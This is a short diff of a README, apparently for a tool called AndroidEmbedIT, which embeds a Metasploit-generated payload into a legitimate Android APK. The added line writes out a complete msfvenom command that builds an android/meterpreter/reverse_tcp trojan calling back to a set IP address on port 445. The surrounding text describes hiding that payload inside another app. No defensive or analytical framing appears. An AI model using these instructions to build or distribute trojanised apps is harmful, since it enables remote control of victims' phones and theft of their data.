@@ -1,4 +1,4 @@
-## AndroidEmbedIT可以配合meterpreter生成的木马进行
+## AndroidEmbedIT可以配合meterpreter生成的木马msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.169.76 lport=445 R > Desktop/123.apk进行
 
 This script performs the following actions to embed a Metasploit
 generated APK file into another legitimate APK.
